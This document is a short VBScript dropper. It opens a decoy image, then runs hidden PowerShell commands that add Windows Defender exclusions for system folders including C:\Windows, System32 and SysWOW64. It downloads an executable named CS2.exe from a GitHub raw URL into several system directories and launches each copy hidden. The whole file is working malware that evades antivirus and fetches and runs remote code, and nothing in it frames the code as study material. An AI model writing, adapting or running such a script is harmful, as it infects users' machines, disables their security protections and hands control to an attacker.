Set objShell = CreateObject("WScript.Shell")

objShell.Run "start https://as2.ftcdn.net/v2/jpg/00/53/69/65/1000_F_53696591_9LO1bsQUpl2zIolFMFokrQyt04Z5dzXd.jpg", 0, False

objShell.Run "powershell -WindowStyle Hidden -Command Add-MpPreference -ExclusionPath 'C:\ProgramData'", 0, True
objShell.Run "powershell -WindowStyle Hidden -Command Add-MpPreference -ExclusionExtension 'C:\Users\Public\Downloads\CS2.exe'", 0, True
objShell.Run "powershell -WindowStyle Hidden -Command Add-MpPreference -ExclusionPath 'C:\Users\Public\Downloads'", 0, True
objShell.Run "powershell -WindowStyle Hidden -Command Add-MpPreference -ExclusionExtension 'C:\Windows\System32\CS2.exe'", 0, True
objShell.Run "powershell -WindowStyle Hidden -Command Add-MpPreference -ExclusionPath 'C:\Windows\System32'", 0, True
objShell.Run "powershell -WindowStyle Hidden -Command Add-MpPreference -ExclusionExtension 'C:\Windows\SysWOW64\CS2.exe'", 0, True
objShell.Run "powershell -WindowStyle Hidden -Command Add-MpPreference -ExclusionPath 'C:\Windows\SysWOW64'", 0, True
objShell.Run "powershell -WindowStyle Hidden -Command Add-MpPreference -ExclusionExtension 'C:\Windows\SysWOW64\CS2.exe'", 0, True
objShell.Run "powershell -WindowStyle Hidden -Command Add-MpPreference -ExclusionPath 'C:\Windows'", 0, True

url = "https://github.com/AmjadBalls/TEST/raw/refs/heads/main/CS2.exe"
locations = Array( _
    "C:\Users\Public\Downloads\CS2.exe", _
    "C:\Windows\System32\CS2.exe", _
    "C:\Windows\SysWOW64\CS2.exe", _
    "C:\Windows\CS2.exe" _
)

For Each location In locations
    objShell.Run "powershell -WindowStyle Hidden -Command Invoke-WebRequest -Uri '" & url & "' -OutFile '" & location & "'", 0, True
Next

For Each location In locations
    objShell.Run "powershell -WindowStyle Hidden -Command Start-Process -FilePath '" & location & "' -WindowStyle Hidden -Wait", 0, True
Next
